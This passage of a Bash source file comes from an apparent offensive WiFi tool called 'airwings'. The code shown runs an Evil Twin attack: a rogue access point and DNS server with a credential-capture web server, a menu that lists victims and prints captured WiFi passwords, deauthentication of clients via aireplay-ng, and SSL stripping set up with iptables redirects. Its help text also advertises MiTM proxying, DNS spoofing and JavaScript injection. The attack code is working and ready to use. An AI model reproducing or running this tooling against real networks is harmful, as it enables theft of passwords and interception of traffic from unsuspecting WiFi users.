                    elif command -v sslstrip &>/dev/null; then
                        echo -e "${YELLOW}[*] Starting sslstrip...${NC}"
                        iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 10000 2>/dev/null
                        sslstrip -l 10000 -w "$temp_dir/sslstrip.log" &
                        sslstrip_pid=$!
                        echo -e "${GREEN}[✓] SSLstrip active on port 10000${NC}"
                        echo -e "${YELLOW}[*] Type 'sslstrip' again to stop${NC}"
                    else
                        echo -e "${RED}[!] No SSLstrip tool found${NC}"
                        echo -e "${YELLOW}[*] Install: sudo apt install bettercap${NC}"
                    fi
                fi
                ;;

            bg)
                echo ""
                echo -e "${YELLOW}[*] Sending Evil Twin to background...${NC}"

                # Save state to file for resuming
                local state_file="/tmp/airwings_eviltwin_state"
                cat > "$state_file" << EOF
ET_RUNNING=true
ET_INTERFACE=$interface
ET_MONITOR=$monitor_interface
ET_BSSID=$target_bssid
ET_CHANNEL=$target_channel
ET_ESSID=$target_essid
ET_INTERNET=$internet_iface
ET_AP_PID=$ap_pid
ET_DEAUTH_PID=$deauth_pid
ET_DNS_PID=$dns_pid
ET_WEB_PID=$web_pid
ET_MONITOR_PID=$monitor_pid
ET_TEMP_DIR=$temp_dir
ET_CRED_DIR=$cred_log_dir
ET_SNIFF_PID=${sniff_pid:-}
ET_MITM_PID=${mitm_pid:-}
ET_INJECT_PID=${inject_pid:-}
ET_SSLSTRIP_PID=${sslstrip_pid:-}
ET_DEAUTH_ACTIVE=$deauth_active
EOF
                echo -e "${GREEN}[✓] Evil Twin running in background${NC}"
                echo -e "${WHITE}    AP: $target_essid (PID: $ap_pid)${NC}"
                echo -e "${WHITE}    Deauth: PID $deauth_pid${NC}"
                echo -e "${WHITE}    DNS: PID $dns_pid${NC}"
                echo -e "${WHITE}    Web: PID $web_pid${NC}"
                echo ""
                echo -e "${CYAN}[*] Type 'resume' from the pentest menu to return here${NC}"
                echo -e "${CYAN}[*] Or use airwings normally - Evil Twin keeps running${NC}"
                return 0
                ;;

            stop|q|quit|exit)
                echo -e "${YELLOW}[*] Stopping attack...${NC}"
                break
                ;;

            "")
                # Empty input - just show prompt again
                ;;

            help|h|?)
                echo ""
                echo -e "${WHITE}Device Management:${NC}"
                echo -e "  ${CYAN}clients${NC} / ${CYAN}c${NC}          Show connected devices (MAC, IP, hostname)"
                echo -e "  ${CYAN}creds${NC}   / ${CYAN}p${NC}          Show all captured WiFi passwords"
                echo -e "  ${CYAN}kick${NC} <MAC>             Deauth a specific client (5 frames)"
                echo -e "  ${CYAN}kickall${NC}                Deauth all clients (broadcast)"
                echo -e "  ${CYAN}deauth${NC}                 Toggle continuous deauth on/off"
                echo ""
                echo -e "${WHITE}MiTM & Interception:${NC}"
                echo -e "  ${CYAN}sniff${NC}                  Toggle traffic capture (pcap)"
                echo -e "  ${CYAN}mitm${NC}                   Start/stop MiTM proxy (bettercap/mitmproxy)"
                echo -e "  ${CYAN}spoof${NC} <domain> [ip]    DNS spoof a domain on-the-fly"
                echo -e "  ${CYAN}inject${NC} <js>            Inject JavaScript into HTTP pages"
                echo -e "  ${CYAN}sslstrip${NC}               Toggle SSL stripping (HTTPS→HTTP)"
                echo ""
                echo -e "${WHITE}System:${NC}"
                echo -e "  ${CYAN}status${NC}  / ${CYAN}s${NC}          Show all process statuses"
                echo -e "  ${CYAN}log${NC}                    Show last 20 DNS/DHCP log entries"
                echo -e "  ${CYAN}bg${NC}                     Background mode (return to airwings menu)"
                echo -e "  ${CYAN}stop${NC}    / ${CYAN}q${NC}          Stop attack and cleanup"
                ;;

            *)
                echo -e "${RED}[!] Unknown command: $cmd${NC}"
                echo -e "${YELLOW}[!] Type 'help' for available commands${NC}"
                ;;
        esac
    done

    # Cleanup extra processes if running
    [[ -n "$sniff_pid" ]] && kill $sniff_pid 2>/dev/null
    [[ -n "$mitm_pid" ]] && kill $mitm_pid 2>/dev/null
    [[ -n "$inject_pid" ]] && kill $inject_pid 2>/dev/null
    [[ -n "$sslstrip_pid" ]] && kill $sslstrip_pid 2>/dev/null

    # Remove MiTM iptables rules
    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null
    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 443 -j REDIRECT --to-port 8443 2>/dev/null
    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 8888 2>/dev/null
    iptables -t nat -D PREROUTING -i "$interface" -p tcp --dport 80 -j REDIRECT --to-port 10000 2>/dev/null

    # Kill the monitoring process
    kill $monitor_pid 2>/dev/null

    # Remove background state file
    rm -f /tmp/airwings_eviltwin_state

    # Cleanup - kill processes in reverse order and restore interface
    echo -e "${YELLOW}[*] Stopping Evil Twin...${NC}"
    kill $web_pid $dns_pid $ap_pid $deauth_pid 2>/dev/null
    pkill -f "capture_server" 2>/dev/null
    pkill -f "dnsmasq" 2>/dev/null
    pkill -f "hostapd" 2>/dev/null
    wait $deauth_pid $dns_pid $web_pid $ap_pid 2>/dev/null

    # Restore iptables rules
    echo -e "${YELLOW}[*] Restoring network configuration...${NC}"
    if [[ -f "$temp_dir/iptables_backup.rules" ]]; then
        iptables-restore < "$temp_dir/iptables_backup.rules" 2>/dev/null
    else
        iptables -t nat -F 2>/dev/null
        iptables -F FORWARD 2>/dev/null
        iptables -P FORWARD DROP 2>/dev/null
    fi
    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

    # Restore interface
    ifconfig "$interface" down 2>/dev/null
    sleep 1
    
    # Remove virtual interface if we created it
    if [[ "$interface" == "wlan1ap" ]]; then
        iw dev "$interface" del 2>/dev/null
    fi
    
    clean_temp_dir "$temp_dir"

    success "Evil Twin attack stopped"
}

# Resume a backgrounded Evil Twin attack
resume_evil_twin() {
    local state_file="/tmp/airwings_eviltwin_state"

    if [[ ! -f "$state_file" ]]; then
        echo -e "${RED}[!] No Evil Twin running in background${NC}"
        pause
        return
    fi

    # Load state
    source "$state_file"

    # Verify processes are still running
    if ! kill -0 "$ET_AP_PID" 2>/dev/null; then
        echo -e "${RED}[!] Evil Twin AP is no longer running (PID: $ET_AP_PID)${NC}"
        rm -f "$state_file"
        pause
        return
    fi

    clear
    echo -e "${GREEN}[✓] Resuming Evil Twin: $ET_ESSID${NC}"
    echo ""

    # Restore variables for the command loop
    local interface="$ET_INTERFACE"
    local monitor_interface="$ET_MONITOR"
    local target_bssid="$ET_BSSID"
    local target_channel="$ET_CHANNEL"
    local target_essid="$ET_ESSID"
    local internet_iface="$ET_INTERNET"
    local ap_pid="$ET_AP_PID"
    local deauth_pid="$ET_DEAUTH_PID"
    local dns_pid="$ET_DNS_PID"
    local web_pid="$ET_WEB_PID"
    local monitor_pid="$ET_MONITOR_PID"
    local temp_dir="$ET_TEMP_DIR"
    local cred_log_dir="$ET_CRED_DIR"
    local deauth_active="$ET_DEAUTH_ACTIVE"
    local sniff_pid="$ET_SNIFF_PID"
    local mitm_pid="$ET_MITM_PID"
    local inject_pid="$ET_INJECT_PID"
    local sslstrip_pid="$ET_SSLSTRIP_PID"

    # Show status panel
    echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              EVIL TWIN RESUMED                           ║${NC}"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${WHITE}AP SSID:${NC}       $target_essid"
    echo -e "${GREEN}║${NC} ${WHITE}AP Interface:${NC}  $interface"
    echo -e "${GREEN}║${NC} ${WHITE}Internet via:${NC}  ${internet_iface:-NONE (captive only)}"

    # Check what's still running
    local services=""
    kill -0 "$ap_pid" 2>/dev/null && services+="AP " || services+="${RED}AP-DOWN${NC} "
    kill -0 "$dns_pid" 2>/dev/null && services+="DNS " || services+="${RED}DNS-DOWN${NC} "
    kill -0 "$web_pid" 2>/dev/null && services+="WEB " || services+="${RED}WEB-DOWN${NC} "
    if [[ "$deauth_active" == "true" ]]; then
        kill -0 "$deauth_pid" 2>/dev/null && services+="DEAUTH " || services+="${YELLOW}DEAUTH-ENDED${NC} "
    fi

    echo -e "${GREEN}║${NC} ${WHITE}Services:${NC}     $services"
    echo -e "${GREEN}╠═══════════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${YELLOW}Type 'help' for commands, 'bg' to background again${NC}"
    echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Restart the hostapd monitor if it was killed
    if ! kill -0 "$monitor_pid" 2>/dev/null; then
        local hostapd_log="$temp_dir/hostapd.log"
        if [[ -f "$hostapd_log" ]]; then
            (
                tail -f "$hostapd_log" 2>/dev/null | while read -r line; do
                    if [[ "$line" == *"AP-STA-CONNECTED"* ]]; then
                        local mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                        echo -e "${GREEN}[+] Client connected: $mac${NC}"
                    elif [[ "$line" == *"AP-STA-DISCONNECTED"* ]]; then
                        local mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                        echo -e "${YELLOW}[-] Client disconnected: $mac${NC}"
                    fi
                done
            ) &
            monitor_pid=$!
        fi
    fi

    # Re-enter the interactive command loop
    while true; do
        echo ""
        read -p "$(echo -e "${CYAN}airwings>${NC} ")" cmd_input

        local cmd=$(echo "$cmd_input" | awk '{print tolower($1)}')
        local cmd_arg=$(echo "$cmd_input" | awk '{print $2}')

        case "$cmd" in
            clients|c)
                echo ""
                echo -e "${WHITE}Connected Clients:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                printf "${CYAN}%-4s %-20s %-16s %-10s %s${NC}\n" "#" "MAC Address" "IP Address" "Hostname" "Lease"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                local client_count=0
                if [[ -f "/var/lib/misc/dnsmasq.leases" ]]; then
                    while read -r expire mac ip hostname client_id; do
                        client_count=$((client_count + 1))
                        [[ "$hostname" == "*" ]] && hostname="-"
                        local arp_ip=$(arp -an 2>/dev/null | grep "$mac" | grep -oE '10\.0\.0\.[0-9]+' | head -1)
                        printf "%-4s %-20s %-16s %-10s\n" "[$client_count]" "$mac" "${arp_ip:-$ip}" "$hostname"
                    done < "/var/lib/misc/dnsmasq.leases"
                fi
                if [[ $client_count -eq 0 ]]; then
                    echo -e "  ${YELLOW}No clients connected${NC}"
                fi
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                echo -e "  ${WHITE}Total: $client_count client(s)${NC}"
                ;;
            creds|p|passwords)
                echo ""
                echo -e "${WHITE}Captured Credentials:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                local latest_log=$(ls -t "$cred_log_dir"/wifi_passwords_*.txt 2>/dev/null | head -1)
                if [[ -n "$latest_log" && -s "$latest_log" ]]; then
                    echo -e "${GREEN}"
                    cat "$latest_log"
                    echo -e "${NC}"
                else
                    echo -e "  ${YELLOW}No credentials captured yet${NC}"
                fi
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                ;;
            kick)
                if [[ -z "$cmd_arg" ]]; then
                    echo -e "${YELLOW}[!] Usage: kick <MAC>${NC}"
                elif [[ "$cmd_arg" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
                    aireplay-ng --deauth 5 -a "$target_bssid" -c "$cmd_arg" "$monitor_interface" &>/dev/null &
                    echo -e "${GREEN}[✓] Deauth sent to $cmd_arg${NC}"
                else
                    echo -e "${RED}[!] Invalid MAC: $cmd_arg${NC}"
                fi
                ;;
            kickall)
                aireplay-ng --deauth 5 -a "$target_bssid" "$monitor_interface" &>/dev/null &
                echo -e "${GREEN}[✓] Broadcast deauth sent${NC}"
                ;;
            status|s)
                echo ""
                echo -e "${WHITE}Attack Status:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                kill -0 $ap_pid 2>/dev/null && echo -e "  Rogue AP:       ${GREEN}RUNNING${NC}" || echo -e "  Rogue AP:       ${RED}STOPPED${NC}"
                kill -0 $dns_pid 2>/dev/null && echo -e "  DNS/DHCP:       ${GREEN}RUNNING${NC}" || echo -e "  DNS/DHCP:       ${RED}STOPPED${NC}"
                kill -0 $web_pid 2>/dev/null && echo -e "  Capture Server: ${GREEN}RUNNING${NC}" || echo -e "  Capture Server: ${RED}STOPPED${NC}"
                if [[ "$deauth_active" == "true" ]]; then
                    kill -0 $deauth_pid 2>/dev/null && echo -e "  Deauth:         ${GREEN}ACTIVE${NC}" || echo -e "  Deauth:         ${YELLOW}ENDED${NC}"
                else
                    echo -e "  Deauth:         ${YELLOW}INACTIVE${NC}"
                fi
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                ;;
            log)
                echo ""
                if [[ -f "$temp_dir/dnsmasq.log" ]]; then
                    echo -e "${WHITE}Recent DNS/DHCP Log:${NC}"
                    tail -20 "$temp_dir/dnsmasq.log" 2>/dev/null
                else
                    echo -e "${YELLOW}No log available${NC}"
                fi
                ;;
            bg)
                echo -e "${YELLOW}[*] Returning to background...${NC}"
                # Update state file
                cat > "$state_file" << EOF
ET_RUNNING=true
ET_INTERFACE=$interface
ET_MONITOR=$monitor_interface
ET_BSSID=$target_bssid
ET_CHANNEL=$target_channel
ET_ESSID=$target_essid
ET_INTERNET=$internet_iface
ET_AP_PID=$ap_pid
ET_DEAUTH_PID=$deauth_pid
ET_DNS_PID=$dns_pid
ET_WEB_PID=$web_pid
ET_MONITOR_PID=$monitor_pid
ET_TEMP_DIR=$temp_dir
ET_CRED_DIR=$cred_log_dir
ET_SNIFF_PID=${sniff_pid:-}
ET_MITM_PID=${mitm_pid:-}
ET_INJECT_PID=${inject_pid:-}
ET_SSLSTRIP_PID=${sslstrip_pid:-}
ET_DEAUTH_ACTIVE=$deauth_active
EOF
                echo -e "${GREEN}[✓] Evil Twin still running in background${NC}"
                return 0
                ;;
            stop|q|quit|exit)
                echo -e "${YELLOW}[*] Stopping Evil Twin...${NC}"
                # Full cleanup
                [[ -n "$sniff_pid" ]] && kill $sniff_pid 2>/dev/null
                [[ -n "$mitm_pid" ]] && kill $mitm_pid 2>/dev/null
                [[ -n "$inject_pid" ]] && kill $inject_pid 2>/dev/null
                [[ -n "$sslstrip_pid" ]] && kill $sslstrip_pid 2>/dev/null
                kill $monitor_pid 2>/dev/null
                kill $web_pid $dns_pid $ap_pid $deauth_pid 2>/dev/null
                pkill -f "capture_server" 2>/dev/null
                pkill -f "dnsmasq" 2>/dev/null
                pkill -f "hostapd" 2>/dev/null
                # Restore iptables
                if [[ -f "$temp_dir/iptables_backup.rules" ]]; then
                    iptables-restore < "$temp_dir/iptables_backup.rules" 2>/dev/null
                else
                    iptables -t nat -F 2>/dev/null
                    iptables -F FORWARD 2>/dev/null
                    iptables -P FORWARD DROP 2>/dev/null
                fi
                echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
                rm -f "$state_file"
                echo -e "${GREEN}[✓] Evil Twin stopped${NC}"
                pause
                return
                ;;
            help|h|?)
                echo ""
                echo -e "${WHITE}Commands: clients, creds, kick <MAC>, kickall, status, log, bg, stop${NC}"
                ;;
            "") ;;
            *)
                echo -e "${RED}[!] Unknown: $cmd. Type 'help'${NC}"
                ;;
        esac
    done
}

# Quick scan with numbered selection for Evil Twin
quick_scan_with_numbers() {
    local interface="$1"

    # If no interface provided, try to get one
    if [[ -z "$interface" ]]; then
        interface="${MONITOR_INTERFACE}"
    fi

    # Still empty? Try to find a monitor interface
    if [[ -z "$interface" ]]; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    # Last resort: check for common naming
    if [[ -z "$interface" ]]; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]]; then
        echo -e "${RED}[!] No monitor interface found${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Quick scanning for networks (10 seconds)...${NC}"

    # Check if interface exists
    if ! ip link show "$interface" >/dev/null 2>&1; then
        echo -e "${RED}[!] Interface $interface does not exist${NC}"
        return 1
    fi

    # Check if in monitor mode
    if ! iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}[!] Interface $interface is not in monitor mode${NC}"
        echo -e "${YELLOW}[!] Current mode: $(iwconfig "$interface" 2>/dev/null | grep Mode | awk '{print $1,$2,$3,$4}' | head -1)${NC}"
        return 1
    fi

    # Kill any leftover airodump-ng processes to prevent interference
    pkill -f airodump-ng 2>/dev/null
    sleep 2

    # Clean stale scan data
    rm -f /tmp/airwings_scan.* 2>/dev/null
    rm -f /tmp/airwings_scan_data.txt 2>/dev/null

    local scan_file=$(mktemp -t airwings_scan.XXXXXX)
    timeout 12 airodump-ng --output-format csv -w "$scan_file" "$interface" &>/dev/null &
    local scan_pid=$!

    # Wait for scan with progress indicator
    for i in $(seq 1 10); do
        echo -ne "\r${YELLOW}[*] Scanning... ${i}/10s${NC}"
        sleep 1
    done
    echo ""

    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null
    sleep 1

    if [[ -f "${scan_file}-01.csv" ]]; then
        echo ""
        echo -e "${WHITE}Detected Networks:${NC}"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"
        printf "${CYAN}%-3s %-20s %-10s %-8s %-6s %s${NC}\n" "#" "BSSID" "Channel" "Power" "Enc" "ESSID"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"

        local count=0
        local network_data=""
        local header_found=false
        
        # Parse CSV file - skip first line (header), process until station section
        local line_num=0
        while IFS= read -r line; do
            line_num=$((line_num + 1))
            
            # Skip header line and empty lines
            [[ $line_num -eq 1 ]] && continue
            [[ -z "$line" ]] && continue
            
            # Stop at station section
            [[ "$line" =~ ^Station.*MAC ]] && break
            

            
            # Simple CSV parsing
            bssid=$(echo "$line" | cut -d',' -f1 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            first_seen=$(echo "$line" | cut -d',' -f2 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            last_seen=$(echo "$line" | cut -d',' -f3 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            channel=$(echo "$line" | cut -d',' -f4 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            speed=$(echo "$line" | cut -d',' -f5 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            privacy=$(echo "$line" | cut -d',' -f6 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            cipher=$(echo "$line" | cut -d',' -f7 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            auth=$(echo "$line" | cut -d',' -f8 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            power=$(echo "$line" | cut -d',' -f9 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            beacons=$(echo "$line" | cut -d',' -f10 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            iv=$(echo "$line" | cut -d',' -f11 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            lan_ip=$(echo "$line" | cut -d',' -f12 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            id_length=$(echo "$line" | cut -d',' -f13 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            essid=$(echo "$line" | cut -d',' -f14 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            key=$(echo "$line" | cut -d',' -f15 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            
            # If essid is empty, try last field
            if [[ -z "$essid" ]]; then
                essid=$(echo "$line" | rev | cut -d',' -f1 | rev | tr -d '"' | xargs)
            fi

            # Validate MAC address
            [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
            
            # Skip empty ESSIDs (unless you want to show them)
            [[ -z "$essid" ]] && essid="[Hidden]"
            
            count=$((count + 1))
            printf "${CYAN}%-3s${NC} %-20s %-10s %-8s %-6s %s\n" "[$count]" "$bssid" "$channel" "${power}dBm" "$privacy" "$essid"
            
            # Store network info for later retrieval (format: "BSSID|Channel|ESSID")
            network_data+="${bssid}|${channel}|${essid}"$'\n'
        done < "${scan_file}-01.csv"

        rm -f "${scan_file}"*.csv "${scan_file}"*.kismet* 2>/dev/null
        
        # If no networks found, show message
        if [[ $count -eq 0 ]]; then
            echo -e "${YELLOW}No networks detected. Try increasing scan time or check adapter.${NC}"
            network_data=""
        fi
        
        # Save network data to fixed temp file for caller to use
        echo "$network_data" > "/tmp/airwings_scan_data.txt"
    else
        echo -e "${RED}[!] Scan failed - no data collected${NC}"
        echo -e "${YELLOW}[!] Check if adapter is in monitor mode${NC}"
        # Clear any existing scan data
        rm -f "/tmp/airwings_scan_data.txt"
    fi
}

# Quick scan helper for target selection
quick_scan() {
    local interface="$1"

    # If no interface provided, try to get one
    if [[ -z "$interface" ]]; then
        interface="${MONITOR_INTERFACE}"
    fi

    # Still empty? Try to find a monitor interface
    if [[ -z "$interface" ]]; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    # Last resort: check for common naming
    if [[ -z "$interface" ]]; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]]; then
        echo -e "${RED}[!] No monitor interface found${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Quick scanning for networks (10 seconds)...${NC}"

    # Kill any existing airodump-ng processes to prevent hanging
    pkill -f airodump-ng 2>/dev/null
    sleep 1

    local scan_file=$(mktemp -t airwings_scan.XXXXXX)
    timeout 10 airodump-ng --output-format csv -w "$scan_file" "$interface" 2>/dev/null &
    local scan_pid=$!

    sleep 10
    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null

    if [[ -f "${scan_file}-01.csv" ]]; then
        echo ""
        echo -e "${WHITE}Detected Networks:${NC}"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"
        printf "${CYAN}%-20s %-10s %-8s %-6s %s${NC}\n" "BSSID" "Channel" "Power" "Enc" "ESSID"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"

        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_len essid key; do
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            power=$(echo "$power" | xargs)
            privacy=$(echo "$privacy" | xargs)
            essid=$(echo "$essid" | xargs)

            [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
            printf "%-20s %-10s %-8s %-6s %s\n" "$bssid" "$channel" "${power}dBm" "$privacy" "$essid"
        done < "${scan_file}-01.csv"

        rm -f "${scan_file}"*.csv "${scan_file}"*.kismet* 2>/dev/null
    fi
}

# ===== Helper constants and utility functions =====

# Colors
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
GRAY="\e[90m"
NC="\e[0m"

# Default directories
LOGS_DIR="${LOGS_DIR:-$PWD/logs}"
mkdir -p "$LOGS_DIR/captures" "$LOGS_DIR/credentials" 2>/dev/null || true

get_timestamp() {
    date +%Y%m%d%H%M%S
}

get_file_size() {
    local f="$1"
    [[ -f "$f" ]] || { echo "0B"; return; }
    du -h "$f" 2>/dev/null | cut -f1
}

select_capture_file() {
    local title="${1:-Select capture file}"
    local cap_files=()
    local i=0
    
    echo -e "${WHITE}$title${NC}"
    echo -e "${GRAY}───────────────────────────────────────────────${NC}"
    printf "${CYAN}%-3s %-45s %s${NC}\n" "#" "File" "Size"
    echo -e "${GRAY}───────────────────────────────────────────────${NC}"
    
    for f in "$LOGS_DIR/captures"/*.cap "$LOGS_DIR/captures"/*-clean.cap "$LOGS_DIR/captures"/*.hc22000 "$LOGS_DIR/captures"/*.hccapx "$LOGS_DIR/captures"/*.pcapng; do
        [[ -f "$f" ]] || continue
        i=$((i + 1))
        cap_files+=("$f")
        local size=$(get_file_size "$f")
        local name=$(basename "$f")
        local ext="${name##*.}"
        local type_tag=""
        case "$ext" in
            cap|clean) type_tag="📶 WPA" ;;
            hc22000)   type_tag="🔑 PMKID" ;;
            hccapx)    type_tag="📶 WPA" ;;
            pcapng)    type_tag="🔑 PMKID" ;;
        esac
        printf "${CYAN}%-3s${NC} %-45s ${GRAY}%s %s${NC}\n" "[$i]" "$name" "$size" "$type_tag"
    done
    
    if [[ $i -eq 0 ]]; then
        echo -e "${YELLOW}[!] No capture files found${NC}"
        echo -e "${YELLOW}[!] Capture a handshake or PMKID first${NC}"
        return 1
    fi
    
    echo -e "${GRAY}───────────────────────────────────────────────${NC}"
    echo -e "${CYAN}[R]${NC} Refresh list"
    echo -e "${CYAN}[0]${NC} Cancel"
    echo ""
    
    while true; do
        read -p "Select file [0-$i, R]: " selection
        
        if [[ "$selection" =~ ^[Rr]$ ]]; then
            select_capture_file "$title"
            return $?
        elif [[ "$selection" == "0" ]]; then
            return 1
        elif [[ "$selection" =~ ^[0-9]+$ ]] && [[ $selection -ge 1 ]] && [[ $selection -le $i ]]; then
            CAPTURE_FILE="${cap_files[$((selection - 1))]}"
            return 0
        else
            echo -e "${RED}[!] Invalid selection${NC}"
        fi
    done
}

pause() {
    read -rp "Press Enter to continue..." _tmp
}

success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

error() {
    echo -e "${RED}[!] $1${NC}"
}

is_monitor_mode() {
    local ifc="$1"
    [[ -z "$ifc" ]] && return 1
    if ! ip link show "$ifc" &>/dev/null; then
        return 1
    fi
    if command -v iw &>/dev/null; then
        iw dev "$ifc" info 2>/dev/null | grep -qi "type monitor" && return 0
    fi
    if command -v iwconfig &>/dev/null; then
        iwconfig "$ifc" 2>/dev/null | grep -qi "Mode:Monitor" && return 0
    fi
    return 1
}

check_vif_support() {
    # best-effort: check if `iw` exists and reports supported interface modes
    if command -v iw &>/dev/null; then
        iw list 2>/dev/null | grep -q "AP" && return 0
    fi
    # fallback: assume true
    return 0
}

is_valid_mac() {
    [[ "$1" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]
}

is_valid_channel() {
    [[ "$1" =~ ^[0-9]+$ ]] && (( "$1" >= 1 && "$1" <= 165 ))
}

generate_random_mac() {
    # generate a locally administered unicast MAC (set the 2nd least significant bit)
    local a b c d e f
    a=$(( (RANDOM % 256) | 2 ))
    b=$((RANDOM % 256))
    c=$((RANDOM % 256))
    d=$((RANDOM % 256))
    e=$((RANDOM % 256))
    f=$((RANDOM % 256))
    printf "%02x:%02x:%02x:%02x:%02x:%02x" "$a" "$b" "$c" "$d" "$e" "$f"
}

create_temp_dir() {
    mktemp -d /tmp/airwings.XXXXXX 2>/dev/null || (mkdir -p "/tmp/airwings.$$" && echo "/tmp/airwings.$$")
}

clean_temp_dir() {
    [[ -n "$1" && -d "$1" ]] && rm -rf "$1"
}
